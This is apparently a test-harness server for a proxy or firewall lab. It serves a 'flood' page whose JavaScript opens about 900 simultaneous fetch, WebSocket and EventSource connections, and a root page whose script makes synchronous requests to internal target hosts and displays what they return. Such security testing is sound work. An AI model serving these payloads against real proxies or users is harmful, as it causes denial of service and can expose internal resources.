"""The flood origin: a 'public' origin that ignores Connection: close and keeps the proxy connection alive; logs every request line."""

import asyncio
import time


async def h(r, w):
    cid = id(w) % 10000
    while True:
        try:
            head = await asyncio.wait_for(r.readuntil(b"\r\n\r\n"), 20)
        except Exception:
            break
        line = head.split(b"\r\n")[0].decode()
        with open("/log/evil.log", "a") as f:
            f.write(f"{time.time():.3f} conn{cid} {line}\n")
        if "/hold" in line:
            await asyncio.sleep(60)
            break
        if line.startswith("GET /flood"):
            body = (
                b"<html><body><h1>flood</h1><p>" + b"padding words here " * 40 + b"</p><script>"
                b"for (let i=0;i<300;i++) { fetch('http://fwtest-flood:8080/hold-f'+i).catch(()=>{}); }"
                b"const W=new Worker(URL.createObjectURL(new Blob([\"for (let i=0;i<300;i++) { try { new WebSocket('ws://fwtest-flood:8080/hold-w'+i); } catch(e){} }\"])));"
                b"for (let i=0;i<300;i++) { try { new EventSource('http://fwtest-flood:8080/hold-e'+i); } catch(e){} }"
                b"</script></body></html>"
            )
        elif line.startswith("GET / ") or line.startswith("GET /?"):
            body = (
                b"<html><body><h1>evil</h1><p>" + b"padding words here " * 40 + b"</p>"
                b"<script>for (const u of ['http://fwtest-target/k1','http://fwtest-origin:8080/k2.js','http://fwtest-target/k3','http://fwtest-flood:8080/k4']) {"
                b"try { const x=new XMLHttpRequest(); x.open('GET', u, false); x.send(); document.body.append(' got:'+u+':'+x.status+':'+x.responseText.slice(0,40)); } catch(e) { document.body.append(' err:'+u); } }</script></body></html>"
            )
        else:
            body = b"// evil answered " + line.encode()
        w.write(
            b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\nConnection: keep-alive\r\nKeep-Alive: timeout=30\r\n\r\n"
            % len(body)
            + body
        )
        await w.drain()
    w.close()


async def main():
    s = await asyncio.start_server(h, "0.0.0.0", 8080)
    async with s:
        await s.serve_forever()


asyncio.run(main())
